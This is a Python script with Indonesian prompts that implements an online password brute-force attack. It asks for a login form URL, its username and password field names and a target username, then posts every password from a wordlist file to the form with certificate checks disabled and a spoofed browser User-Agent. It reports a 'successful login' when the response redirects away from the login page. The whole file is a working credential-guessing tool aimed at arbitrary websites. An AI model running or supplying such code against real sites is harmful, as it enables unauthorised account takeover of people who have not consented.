import os
import time
import datetime
import requests
import urllib3
import datetime
from alive_progress import alive_bar
from colorama import Fore, Back, Style, init

init()

Tanggal = datetime.datetime.now()
file_name = Tanggal.strftime("%d%b%Y_%H%M%S")  

def bruteV2():
    localtime = time.time()

    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}

    link_target = input(str(Fore.YELLOW +"Masukan Link Target Form Login : "+ Style.RESET_ALL))
    Parameter1 = input(str(Fore.YELLOW +"Masukan Parameter user         : "+ Style.RESET_ALL))
    Parameter2 = input(str(Fore.YELLOW +"Masukan Parameter pass         : "+ Style.RESET_ALL))
    username = input(str(Fore.YELLOW +"Username / Email               : "+ Style.RESET_ALL))
    print("\n########### Login Mass Berjalan ###########")
    with open ("./wordlist/password.txt", "r", encoding='utf8', errors='ignore') as myFile:
        data = myFile.readlines()

    jumlah = sum(1 for _ in data)

    with alive_bar(jumlah, force_tty=True,bar='classic' , spinner='classic') as Bar:
        for i in range(0,len(data)):
            password = data[i].rstrip('\n')
            try:
                urllib3.disable_warnings()
                data_dict = {Parameter1:username,Parameter2:password}
                req = requests.post(link_target, verify = False,headers = headers, data=data_dict,allow_redirects=True)
                validasi = link_target == req.url
                check = bool(validasi)
                if(check == False):
                    print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ",Style.RESET_ALL,password, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,req.status_code)
                    break
                elif('Username Atau Password Salah' in str(req.content) or 'tidak' in str(req.content) or 'failed!' in str(req.content) or 'User'  in str(req.content) or  'Nama' in str(req.content) or 'Telah terjadi error:' in str(req.content) or 'Email harus berupa alamat surel yang valid.' in str(req.content) or 'error' in str(req.content) or 'Telah' in str(req.content) or 'Email' in str(req.content) or 'Identitas tersebut tidak cocok dengan data kami.' in str(req.content) or 'tidak' in str(req.content) or 'aktif ' in str(req.content) or 'Acount' in str(req.content) or 'Email' in str(req.content) or 'The Email field must contain a valid email address.' in str(req.content) or 'Incorrect username or password.' in str(req.content) or 'Incorrect' in str(req.content) or 'salah' in str(req.content) or  'Username atau Password salah' in str(req.content) or 'Username tidak ditemukan' in str(req.content) or 'Password yang anda masukan salah' in str(req.content) or 'Username atau Password Salah' in str(req.content) or 'Username Salah' in str(req.content) or 'Password Salah' in str(req.content) or 'Username Belum Terdaftar' in str(req.content)):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)
                elif(int(req.status_code) == 302):
                    print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)                   
                elif(int(req.status_code) == 400):
                     print(Fore.GREEN +"[INFO]",Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ", Style.RESET_ALL,password,Fore.RED + "Login Gagal" + Style.RESET_ALL,req.status_code)                               
                #else:
                    #print(Fore.GREEN +"[SUCCESS]",   Fore.YELLOW + "Website :", Style.RESET_ALL,req.url,Fore.YELLOW +"Username : ", Style.RESET_ALL,username,Fore.YELLOW +"Password : ",Style.RESET_ALL,password, Fore.GREEN + "Login Berhasil" + Style.RESET_ALL,req.status_code)
                    #break
                #link = req.url
                #simpan_log = "Username {} Password {} Website {}\n".format(u,u,link)
                #log = open("./log/bruteV1/{}.txt".format(file_name),'a')
                #log.write(str(simpan_log))
            except requests.exceptions.RequestException as e:
                print(e)
            Bar()
    print(Fore.YELLOW +  "#############################################")
    print("Login Masal Selesai")
    print("Log Tersimpan Pada Folder log Dengan Nama {}.txt".format(file_name+ Style.RESET_ALL),Fore.RED)